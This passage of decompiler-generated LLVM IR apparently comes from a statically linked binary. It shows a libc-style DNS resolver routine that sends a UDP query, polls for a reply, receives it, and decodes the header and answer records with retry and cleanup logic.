  %v3_100131a8.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100131a8

dec_label_pc_100131a8:                            ; preds = %dec_label_pc_1001317c, %dec_label_pc_10013194
  %v3_100131a8 = phi i16 [ 10, %dec_label_pc_1001317c ], [ %v3_100131a8.pre, %dec_label_pc_10013194 ]
  %v4_100131a8 = sext i16 %v3_100131a8 to i32
  store i32 268513720, i32* @lr, align 4
  %v3_100131b4 = call i32 @socket(i32 %v4_100131a8, i32 2, i32 17)
  store i32 %v3_100131b4, i32* @r19, align 4
  %v1_100131b8 = icmp slt i32 %v3_100131b4, 0
  br i1 %v1_100131b8, label %dec_label_pc_100131e4, label %dec_label_pc_100131c0

dec_label_pc_100131c0:                            ; preds = %dec_label_pc_100131a8
  store i32 268513740, i32* @lr, align 4
  %v3_100131c8 = call i32 @__libc_connect(i32 %v2_100131c0, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_100131c8, -1
  br i1 %tmp60, label %dec_label_pc_100131ec, label %dec_label_pc_100131d4

dec_label_pc_100131d4:                            ; preds = %dec_label_pc_100131c0
  %v0_100131d4 = call i32 @__errno_location()
  %v1_100131d8 = inttoptr i32 %v0_100131d4 to i32*
  %v2_100131d8 = load i32, i32* %v1_100131d8, align 4
  store i32 %v2_100131d8, i32* %r0.global-to-local, align 4
  %v3_100131dc = icmp eq i32 %v2_100131d8, 101
  br i1 %v3_100131dc, label %dec_label_pc_10013524, label %dec_label_pc_100131e4

dec_label_pc_100131e4:                            ; preds = %dec_label_pc_100131d4, %dec_label_pc_100131a8
  %v0_100131e4 = load i32, i32* %r18.global-to-local, align 4
  %v1_100131e4 = add i32 %v0_100131e4, 1
  store i32 %v1_100131e4, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_100131e4, 3
  br i1 %tmp61, label %dec_label_pc_10013034, label %dec_label_pc_10013558

dec_label_pc_100131ec:                            ; preds = %dec_label_pc_100131c0
  %v0_100131ec = load i32, i32* @r28, align 4
  %v1_100131ec = load i32, i32* @r27, align 4
  %v2_100131ec = add i32 %v1_100131ec, %v0_100131ec
  %v0_100131f0 = load i32, i32* @r30, align 4
  %v0_100131f8 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10013200.688 to i32), i32* @lr, align 4
  %v4_100131fc = call i32 @__libc_send(i32 %v0_100131f8, i32 %v0_100131f0, i32 %v2_100131ec, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10013214 = load i32, i32* @r19, align 4
  store i32 %v0_10013214, i32* %stack_var_-248, align 4
  store i32 268513820, i32* @lr, align 4
  %v3_10013218 = call i32 @__libc_poll(i32 %v2_10013204, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10013218, 1
  br i1 %tmp62, label %dec_label_pc_10013524, label %dec_label_pc_10013224

dec_label_pc_10013224:                            ; preds = %dec_label_pc_100131ec
  %v0_10013224 = load i32, i32* @r19, align 4
  %v0_10013228 = load i32, i32* @r30, align 4
  store i32 268513848, i32* @lr, align 4
  %v4_10013234 = call i32 @__libc_recv(i32 %v0_10013224, i32 %v0_10013228, i32 512, i32 0)
  store i32 %v4_10013234, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10013234, 12
  br i1 %tmp63, label %dec_label_pc_100134cc, label %dec_label_pc_10013244

dec_label_pc_10013244:                            ; preds = %dec_label_pc_10013224
  %v0_10013244 = load i32, i32* @r30, align 4
  %v2_1001324c = inttoptr i32 %v0_10013244 to i8*
  %v3_1001324c = call i32 @__decode_header(i8* %v2_1001324c, i32 %v2_1001304c)
  %v3_10013250 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10013250, i32* @r20, align 4
  %v1_10013254 = load i32, i32* @r25, align 4
  %v4_10013254 = icmp eq i32 %v3_10013250, %v1_10013254
  br i1 %v4_10013254, label %dec_label_pc_1001325c, label %dec_label_pc_100134cc

dec_label_pc_1001325c:                            ; preds = %dec_label_pc_10013244
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10013260, label %dec_label_pc_100134cc, label %dec_label_pc_10013268

dec_label_pc_10013268:                            ; preds = %dec_label_pc_1001325c
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1001326c, label %dec_label_pc_10013274, label %dec_label_pc_100132dc

dec_label_pc_10013274:                            ; preds = %dec_label_pc_10013268
  %v0_10013274 = load i32, i32* %r17.global-to-local, align 4
  %v3_10013274 = icmp eq i32 %v0_10013274, 0
  br i1 %v3_10013274, label %dec_label_pc_1001327c, label %dec_label_pc_100132d0

dec_label_pc_1001327c:                            ; preds = %dec_label_pc_10013274
  store i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012fd8, i32* %r28.global-to-local, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v0_10013298 = call i32 @__pthread_return_void()
  %v0_100132a0 = call i32 @__pthread_return_0()
  %v3_100132a8 = load i32, i32* @global_var_1002ac18.683, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v1_100132b4 = add i32 %v3_100132a8, -1
  store i32 %v1_100132b4, i32* %r29.global-to-local, align 4
  %v0_100132b8 = call i32 @__pthread_return_void()
  %v0_100132bc = load i32, i32* @r22, align 4
  %v2_100132bc = icmp slt i32 %v0_100132bc, %v1_100132b4
  br i1 %v2_100132bc, label %dec_label_pc_100132c4, label %dec_label_pc_100132d0

dec_label_pc_100132c4:                            ; preds = %dec_label_pc_1001327c
  %v1_100132c4 = add i32 %v0_100132bc, 1
  store i32 %v1_100132c4, i32* @r22, align 4
  %v0_100132c8 = load i32, i32* @r20, align 4
  store i32 %v0_100132c8, i32* @r25, align 4
  br label %dec_label_pc_10013540thread-pre-split.backedge

dec_label_pc_10013540thread-pre-split.backedge:   ; preds = %dec_label_pc_100132c4, %dec_label_pc_1001351c, %dec_label_pc_1001353c
  %v0_10013540.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp64 = icmp ult i32 %v0_10013540.pr, 3
  br i1 %tmp64, label %dec_label_pc_10013034.lr.ph, label %dec_label_pc_10013558

dec_label_pc_100132d0:                            ; preds = %dec_label_pc_1001327c, %dec_label_pc_10013274
  %v0_100132d0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10013304

dec_label_pc_100132dc:                            ; preds = %dec_label_pc_10013268
  br i1 %v3_100132dc, label %dec_label_pc_100132e4, label %dec_label_pc_100134cc

dec_label_pc_100132e4:                            ; preds = %dec_label_pc_100132dc
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_100132fc, label %dec_label_pc_100132f0

dec_label_pc_100132f0:                            ; preds = %dec_label_pc_100132e4
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1001331c10 = load i32, i32* @r30, align 4
  store i32 %v0_1001331c10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001330c

dec_label_pc_100132fc:                            ; preds = %dec_label_pc_100132e4
  %v0_100132fc = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10013304

dec_label_pc_10013304:                            ; preds = %dec_label_pc_100132d0, %dec_label_pc_100132fc
  %storemerge3 = phi i32 [ %v0_100132fc, %dec_label_pc_100132fc ], [ %v0_100132d0, %dec_label_pc_100132d0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_100132fc ], [ 1, %dec_label_pc_100132d0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10013304 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10013304, align 4
  br label %dec_label_pc_10013568

dec_label_pc_1001330c:                            ; preds = %dec_label_pc_100132f0, %dec_label_pc_1001330c
  %v0_1001331c14 = phi i32 [ %v0_1001331c10, %dec_label_pc_100132f0 ], [ %v0_1001331c, %dec_label_pc_1001330c ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_100132f0 ], [ %v2_10013310, %dec_label_pc_1001330c ]
  store i32 268514064, i32* @lr, align 4
  %v2_1001330c = call i32 @__length_question(i32 %v0_1001331c14, i32 %storemerge213)
  %v0_10013310 = load i32, i32* %r28.global-to-local, align 4
  %v2_10013310 = add i32 %v0_10013310, %v2_1001330c
  %v0_10013320.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10013310, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10013310, i32* @r4, align 4
  %v0_1001331c = load i32, i32* @r30, align 4
  store i32 %v0_1001331c, i32* @r3, align 4
  %v2_10013320 = icmp slt i32 %v0_10013320.pr, 1
  %v1_10013324 = add i32 %v0_10013320.pr, 1
  store i32 %v1_10013324, i32* %r29.global-to-local, align 4
  br i1 %v2_10013320, label %dec_label_pc_1001330c, label %dec_label_pc_1001332c

dec_label_pc_1001332c:                            ; preds = %dec_label_pc_1001330c
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_100132e8, label %dec_label_pc_10013478, label %dec_label_pc_10013480

dec_label_pc_1001333c:                            ; preds = %dec_label_pc_10013478
  store i32 %v2_1001333c, i32* %r29.global-to-local, align 4
  %v0_10013340 = load i32, i32* @r30, align 4
  store i32 268514132, i32* @lr, align 4
  %v5_10013350 = call i32 @__decode_answer(i32 %v0_10013340, i32 %v0_10013344, i32 %v1_10013478, i32* nonnull %stack_var_-184)
  store i32 %v5_10013350, i32* %r15.global-to-local, align 4
  %tmp65 = icmp sgt i32 %v5_10013350, -1
  br i1 %tmp65, label %dec_label_pc_10013374, label %dec_label_pc_1001335c

dec_label_pc_1001335c:                            ; preds = %dec_label_pc_1001333c
  %v0_1001335c = load i32, i32* @r24, align 4
  %v3_1001335c = icmp eq i32 %v0_1001335c, 0
  br i1 %v3_1001335c, label %dec_label_pc_100134cc, label %dec_label_pc_10013364

dec_label_pc_10013364:                            ; preds = %dec_label_pc_1001335c
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10013368, label %dec_label_pc_100134cc, label %dec_label_pc_10013480

dec_label_pc_10013374:                            ; preds = %dec_label_pc_1001333c
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10013378 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10013378, label %dec_label_pc_1001341c, label %dec_label_pc_10013380

dec_label_pc_10013380:                            ; preds = %dec_label_pc_10013374
  %v0_10013380 = load i32, i32* @r31, align 4
  store i32 %v2_1001333c, i32* @r4, align 4
  %v1_10013388 = add i32 %v0_10013380, 28
  %v2_10013388 = inttoptr i32 %v1_10013388 to i32*
  %v3_10013388 = load i32, i32* %v2_10013388, align 4
  store i32 %v3_10013388, i32* %r0.global-to-local, align 4
  store i32 %v0_10013380, i32* @r3, align 4
  %v1_10013390 = add i32 %v0_10013380, 36
  %v2_10013390 = inttoptr i32 %v1_10013390 to i32*
  %v3_10013390 = load i32, i32* %v2_10013390, align 4
  store i32 %v3_10013390, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268514216, i32* @lr, align 4
  %v0_100133a4 = call i32 @memcpy()
  %v0_100133a8 = load i32, i32* @r31, align 4
  %v1_100133a8 = add i32 %v0_100133a8, 4
  %v2_100133a8 = inttoptr i32 %v1_100133a8 to i32*
  %v3_100133a8 = load i32, i32* %v2_100133a8, align 4
  %v3_100133ac = icmp eq i32 %v3_100133a8, 24
  br i1 %v3_100133ac, label %dec_label_pc_10013380.dec_label_pc_100133d0_crit_edge, label %dec_label_pc_100133b4

dec_label_pc_10013380.dec_label_pc_100133d0_crit_edge: ; preds = %dec_label_pc_10013380
  %v1_100133d0.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_100133d0

dec_label_pc_100133b4:                            ; preds = %dec_label_pc_10013380
  %v1_100133b4 = add i32 %v0_100133a8, 28
  %v2_100133b4 = inttoptr i32 %v1_100133b4 to i32*
  %v3_100133b4 = load i32, i32* %v2_100133b4, align 4
  store i32 %v3_100133b4, i32* %r0.global-to-local, align 4
  %v3_100133b8 = icmp eq i32 %v3_100133b4, 0
  br i1 %v3_100133b8, label %dec_label_pc_10013480, label %dec_label_pc_100133c0

dec_label_pc_100133c0:                            ; preds = %dec_label_pc_100133b4
  %v0_100133c0 = load i32, i32* %r16.global-to-local, align 4
  %v3_100133c0 = icmp eq i32 %v0_100133c0, 1
  br i1 %v3_100133c0, label %dec_label_pc_100133d0, label %dec_label_pc_100133c8

dec_label_pc_100133c8:                            ; preds = %dec_label_pc_100133c0
  %v3_100133c8 = icmp eq i32 %v0_100133c0, 28
  br i1 %v3_100133c8, label %dec_label_pc_100133d0, label %dec_label_pc_10013480

dec_label_pc_100133d0:                            ; preds = %dec_label_pc_10013380.dec_label_pc_100133d0_crit_edge, %dec_label_pc_100133c8, %dec_label_pc_100133c0
  %v1_100133d0 = phi i32 [ %v1_100133d0.pre, %dec_label_pc_10013380.dec_label_pc_100133d0_crit_edge ], [ 28, %dec_label_pc_100133c8 ], [ 1, %dec_label_pc_100133c0 ]
  %v4_100133d0 = icmp eq i32 %v3_100133a8, %v1_100133d0
  br i1 %v4_100133d0, label %dec_label_pc_100133e4, label %dec_label_pc_100133d8

dec_label_pc_100133d8:                            ; preds = %dec_label_pc_100133d0
  %v1_100133d8 = inttoptr i32 %v0_100133a8 to i32*
  %v2_100133d8 = load i32, i32* %v1_100133d8, align 4
  store i32 ptrtoint (i32* @global_var_100133e0.691 to i32), i32* @lr, align 4
  %v1_100133dc = call i32 @free(i32 %v2_100133d8)
  br label %dec_label_pc_10013464

dec_label_pc_100133e4:                            ; preds = %dec_label_pc_100133d0
  %v1_100133e8 = add i32 %v0_100133a8, 16
  %v2_100133e8 = inttoptr i32 %v1_100133e8 to i32*
  %v3_100133e8 = load i32, i32* %v2_100133e8, align 4
  store i32 %v3_100133e8, i32* %r11.global-to-local, align 4
  %v0_100133ec = load i32, i32* @r24, align 4
  %v2_100133ec = sub i32 %tmp35, %v0_100133ec
  %v1_100133f0 = add i32 %v0_100133a8, 32
  %v2_100133f0 = inttoptr i32 %v1_100133f0 to i32*
  %v3_100133f0 = load i32, i32* %v2_100133f0, align 4
  store i32 %v3_100133f0, i32* %r0.global-to-local, align 4
  %v1_100133f4 = add i32 %v2_100133ec, -1
  %v1_100133f8 = add i32 %v3_100133e8, 4
  %v2_100133fc = mul i32 %v1_100133f4, %v1_100133f8
  store i32 %v2_100133fc, i32* %r11.global-to-local, align 4
  %v2_10013400 = add i32 %v0_100133a8, 36
  %v3_10013400 = inttoptr i32 %v2_10013400 to i32*
  store i32 %v1_100133f4, i32* %v3_10013400, align 4
  %v0_10013404 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013404 = load i32, i32* %r0.global-to-local, align 4
  %v3_10013404 = icmp ugt i32 %v0_10013404, %v1_10013404
  br i1 %v3_10013404, label %dec_label_pc_10013480, label %dec_label_pc_1001340c

dec_label_pc_1001340c:                            ; preds = %dec_label_pc_100133e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10013414 = load i32, i32* @r31, align 4
  %v2_10013414 = add i32 %v1_10013414, 36
  %v3_10013414 = inttoptr i32 %v2_10013414 to i32*
  store i32 0, i32* %v3_10013414, align 4
  br label %dec_label_pc_10013464

dec_label_pc_1001341c:                            ; preds = %dec_label_pc_10013374
  %v3_1001341c = load i32, i32* %stack_var_-184, align 4
  store i32 268514340, i32* @lr, align 4
  %v1_10013420 = call i32 @free(i32 %v3_1001341c)
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10013428 = load i32, i32* %r16.global-to-local, align 4
  %v4_10013428 = icmp eq i32 %tmp29, %v1_10013428
  br i1 %v4_10013428, label %dec_label_pc_10013430, label %dec_label_pc_10013464

dec_label_pc_10013430:                            ; preds = %dec_label_pc_1001341c
  %v0_10013430 = load i32, i32* @r31, align 4
  %v1_10013430 = add i32 %v0_10013430, 16
  %v2_10013430 = inttoptr i32 %v1_10013430 to i32*
  %v3_10013430 = load i32, i32* %v2_10013430, align 4
  store i32 %v3_10013430, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10013438 = icmp eq i32 %v3_10013430, %tmp28
  br i1 %v4_10013438, label %dec_label_pc_10013440, label %dec_label_pc_100134c4

dec_label_pc_10013440:                            ; preds = %dec_label_pc_10013430
  %v1_10013440 = add i32 %v0_10013430, 36
  %v2_10013440 = inttoptr i32 %v1_10013440 to i32*
  %v3_10013440 = load i32, i32* %v2_10013440, align 4
  %v1_10013444 = add i32 %v0_10013430, 28
  %v2_10013444 = inttoptr i32 %v1_10013444 to i32*
  %v3_10013444 = load i32, i32* %v2_10013444, align 4
  store i32 %v3_10013444, i32* %r0.global-to-local, align 4
  %v2_10013448 = mul i32 %v3_10013440, %tmp28
  %v2_10013450 = add i32 %v3_10013444, %v2_10013448
  store i32 %v2_10013450, i32* @r3, align 4
  store i32 268514392, i32* @lr, align 4
  %v0_10013454 = call i32 @memcpy()
  %v0_10013458 = load i32, i32* @r31, align 4
  %v1_10013458 = add i32 %v0_10013458, 36
  %v2_10013458 = inttoptr i32 %v1_10013458 to i32*
  %v3_10013458 = load i32, i32* %v2_10013458, align 4
  %v1_1001345c = add i32 %v3_10013458, 1
  store i32 %v1_1001345c, i32* %v2_10013458, align 4
  br label %dec_label_pc_10013464

dec_label_pc_10013464:                            ; preds = %dec_label_pc_1001341c, %dec_label_pc_1001340c, %dec_label_pc_100133d8, %dec_label_pc_10013440
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10013440 ], [ 0, %dec_label_pc_1001341c ], [ 0, %dec_label_pc_1001340c ], [ %stack_var_-88.118, %dec_label_pc_100133d8 ]
  %v0_10013464 = load i32, i32* @r28, align 4
  %v1_10013464 = load i32, i32* %r15.global-to-local, align 4
  %v2_10013464 = add i32 %v1_10013464, %v0_10013464
  store i32 %v2_10013464, i32* %r28.global-to-local, align 4
  %v0_10013468 = load i32, i32* @r24, align 4
  %v1_10013468 = add i32 %v0_10013468, 1
  store i32 %v1_10013468, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10013470 = icmp slt i32 %v1_10013468, %tmp35
  br i1 %v2_10013470, label %dec_label_pc_10013478, label %dec_label_pc_10013480

dec_label_pc_10013478:                            ; preds = %dec_label_pc_1001332c, %dec_label_pc_10013464
  %v0_10013344 = phi i32 [ %v2_10013464, %dec_label_pc_10013464 ], [ %v2_10013310, %dec_label_pc_1001332c ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10013464 ], [ 1, %dec_label_pc_1001332c ]
  %v1_10013478 = load i32, i32* @r27, align 4
  %v2_10013478 = icmp slt i32 %v0_10013344, %v1_10013478
  br i1 %v2_10013478, label %dec_label_pc_1001333c, label %dec_label_pc_10013480

dec_label_pc_10013480:                            ; preds = %dec_label_pc_10013364, %dec_label_pc_1001332c, %dec_label_pc_100133b4, %dec_label_pc_100133e4, %dec_label_pc_10013478, %dec_label_pc_10013464, %dec_label_pc_100133c8
  %v0_10013480 = load i32, i32* @r19, align 4
  store i32 268514440, i32* @lr, align 4
  %v1_10013484 = call i32 @__libc_close(i32 %v0_10013480)
  %v3_1001348c = icmp eq i32 %arg5, 0
  %v0_1001349c = load i32, i32* @r30, align 4
  br i1 %v3_1001348c, label %dec_label_pc_1001349c, label %dec_label_pc_10013494

dec_label_pc_10013494:                            ; preds = %dec_label_pc_10013480
  %v2_10013494 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1001349c, i32* %v2_10013494, align 4
  br label %dec_label_pc_100134a4

dec_label_pc_1001349c:                            ; preds = %dec_label_pc_10013480
  store i32 268514468, i32* @lr, align 4
  %v1_100134a0 = call i32 @free(i32 %v0_1001349c)
  br label %dec_label_pc_100134a4

dec_label_pc_100134a4:                            ; preds = %dec_label_pc_10013494, %dec_label_pc_1001349c
  %v0_100134a4 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268514480, i32* @lr, align 4
  %v1_100134ac = call i32 @free(i32 %v0_100134a4)
  store i32 ptrtoint (i32* @global_var_10030e50.679 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100135a8

dec_label_pc_100134c4:                            ; preds = %dec_label_pc_10013430
  %v1_100134c4 = inttoptr i32 %v0_10013430 to i32*
  %v2_100134c4 = load i32, i32* %v1_100134c4, align 4
  store i32 268514508, i32* @lr, align 4
  %v1_100134c8 = call i32 @free(i32 %v2_100134c4)
  br label %dec_label_pc_100134cc

dec_label_pc_100134cc:                            ; preds = %dec_label_pc_100132dc, %dec_label_pc_10013244, %dec_label_pc_1001325c, %dec_label_pc_10013224, %dec_label_pc_10013364, %dec_label_pc_1001335c, %dec_label_pc_100134c4
  %v0_100134cc = load i32, i32* %r17.global-to-local, align 4
  %v3_100134cc = icmp eq i32 %v0_100134cc, 0
  br i1 %v3_100134cc, label %dec_label_pc_100134d4, label %dec_label_pc_10013524

dec_label_pc_100134d4:                            ; preds = %dec_label_pc_100134cc
  store i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012fd8, i32* %r28.global-to-local, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v0_100134f0 = call i32 @__pthread_return_void()
  %v0_100134f8 = call i32 @__pthread_return_0()
  %v3_10013500 = load i32, i32* @global_var_1002ac18.683, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v1_1001350c = add i32 %v3_10013500, -1
  store i32 %v1_1001350c, i32* %r29.global-to-local, align 4
  %v0_10013510 = call i32 @__pthread_return_void()
  %v0_10013514 = load i32, i32* @r22, align 4
  %v2_10013514 = icmp slt i32 %v0_10013514, %v1_1001350c
  br i1 %v2_10013514, label %dec_label_pc_1001351c, label %dec_label_pc_10013524

dec_label_pc_1001351c:                            ; preds = %dec_label_pc_100134d4
  %v1_1001351c = add i32 %v0_10013514, 1
  store i32 %v1_1001351c, i32* @r22, align 4
  br label %dec_label_pc_10013540thread-pre-split.backedge

dec_label_pc_10013524:                            ; preds = %dec_label_pc_100131d4, %dec_label_pc_100134d4, %dec_label_pc_100134cc, %dec_label_pc_100131ec
  %v0_10013524 = load i32, i32* @r26, align 4
  %v1_10013524 = add i32 %v0_10013524, 1
  store i32 %v1_10013524, i32* %r0.global-to-local, align 4
  %v1_10013528 = load i32, i32* @r23, align 4
  %v2_10013528 = srem i32 %v1_10013524, %v1_10013528
  store i32 %v2_10013528, i32* @r26, align 4
  %v5_10013530 = icmp eq i32 %v2_10013528, 0
  br i1 %v5_10013530, label %dec_label_pc_10013538, label %dec_label_pc_1001353c

dec_label_pc_10013538:                            ; preds = %dec_label_pc_10013524
  %v0_10013538 = load i32, i32* %r18.global-to-local, align 4
  %v1_10013538 = add i32 %v0_10013538, 1
  store i32 %v1_10013538, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1001353c

dec_label_pc_1001353c:                            ; preds = %dec_label_pc_10013524, %dec_label_pc_10013538
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10013540thread-pre-split.backedge

dec_label_pc_10013034.lr.ph:                      ; preds = %dec_label_pc_10013034.lr.ph.lr.ph, %dec_label_pc_10013540thread-pre-split.backedge
  br label %dec_label_pc_10013034

dec_label_pc_1001354c:                            ; preds = %dec_label_pc_10012fac, %dec_label_pc_10012fa4, %dec_label_pc_10012f9c, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10013558

dec_label_pc_10013558:                            ; preds = %dec_label_pc_10013540thread-pre-split.backedge, %dec_label_pc_10013044, %dec_label_pc_10013120, %dec_label_pc_100131e4, %dec_label_pc_10012fb8, %dec_label_pc_1001354c
  %v0_10013558 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10013560 = inttoptr i32 %v0_10013558 to i32*
  store i32 -1, i32* %v2_10013560, align 4
  %v0_10013564 = load i32, i32* @r25, align 4
  store i32 %v0_10013564, i32* @r20, align 4
  br label %dec_label_pc_10013568

dec_label_pc_10013568:                            ; preds = %dec_label_pc_10013304, %dec_label_pc_10013558
  %v0_10013568 = load i32, i32* @r19, align 4
  %v3_10013568 = icmp eq i32 %v0_10013568, -1
  br i1 %v3_10013568, label %dec_label_pc_10013578, label %dec_label_pc_10013570

dec_label_pc_10013570:                            ; preds = %dec_label_pc_10013568
  store i32 268514680, i32* @lr, align 4
  %v1_10013574 = call i32 @__libc_close(i32 %v0_10013568)
  br label %dec_label_pc_10013578

dec_label_pc_10013578:                            ; preds = %dec_label_pc_10013568, %dec_label_pc_10013570
  %v0_10013578 = load i32, i32* @r21, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268514692, i32* @lr, align 4
  %v1_10013580 = call i32 @free(i32 %v0_10013578)
  %v0_10013584 = load i32, i32* @r30, align 4
  store i32 268514700, i32* @lr, align 4
  %v1_10013588 = call i32 @free(i32 %v0_10013584)
  %v0_1001358c = load i32, i32* @r26, align 4
  %v3_1001358c = icmp eq i32 %v0_1001358c, -1
  br i1 %v3_1001358c, label %dec_label_pc_100135d8, label %dec_label_pc_10013594

dec_label_pc_10013594:                            ; preds = %dec_label_pc_10013578
  store i32 ptrtoint (i32* @global_var_10030e50.679 to i32), i32* %r29.global-to-local, align 4
  %v2_100135a0 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_100135a8

dec_label_pc_100135a8:                            ; preds = %dec_label_pc_100134a4, %dec_label_pc_10013594
  %storemerge68 = phi i32 [ %v2_100135a0, %dec_label_pc_10013594 ], [ %v2_10012fd8, %dec_label_pc_100134a4 ]
  %v1_100135ac.pre-phi = phi i32 [ %v2_100135a0, %dec_label_pc_10013594 ], [ %v2_10012fd8, %dec_label_pc_100134a4 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_100135ac.pre-phi, i32* @r3, align 4
  %v0_100135b0 = call i32 @__pthread_return_void()
  %v0_100135b8 = call i32 @__pthread_return_0()
  %v0_100135c0 = load i32, i32* @r26, align 4
  store i32 %v0_100135c0, i32* @global_var_1002ac10.680, align 4
  store i32 %v1_100135ac.pre-phi, i32* @r3, align 4
  %v0_100135d0 = load i32, i32* @r20, align 4
  %v1_100135d0 = trunc i32 %v0_100135d0 to i16
  store i16 %v1_100135d0, i16* @global_var_1002ab24.681, align 2
  %v0_100135d4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100135d8

dec_label_pc_100135d8:                            ; preds = %dec_label_pc_10013578, %dec_label_pc_100135a8
  store i32 %v0_10012f58, i32* %r0.global-to-local, align 4
  %v0_100135dc = load i32, i32* @r27, align 4
  ret i32 %v0_100135dc

; uselistorder directives
  uselistorder i32 %v1_100135ac.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10013528, { 1, 0 }
  uselistorder i32 %v0_1001349c, { 1, 0 }
  uselistorder i32 %v1_10013478, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10013344, { 1, 0 }
  uselistorder i32 %v1_10013468, { 1, 0 }
  uselistorder i32 %v0_10013430, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100133f4, { 1, 0 }
  uselistorder i32 %v0_10013380, { 2, 1, 0 }
  uselistorder i32 %v0_1001331c, { 1, 0 }
  uselistorder i32 %v2_10013310, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10013234, { 1, 0 }
  uselistorder i32 %v1_10013134, { 1, 0 }
  uselistorder i32 %v1_10013108, { 1, 0 }
  uselistorder i32 %v1_100130d4, { 1, 0 }
  uselistorder i32 %v1_1001306c, { 1, 0 }
  uselistorder i32 %v2_10012fd8, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 12, 13, 14, 15, 16, 0, 1, 10, 11, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r28.global-to-local, { 0, 8, 9, 1, 6, 7, 2, 3, 4, 5 }
  uselistorder i32* %r18.global-to-local, { 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 23, 24, 1, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 21, 2, 0, 20, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 101, { 2, 0, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
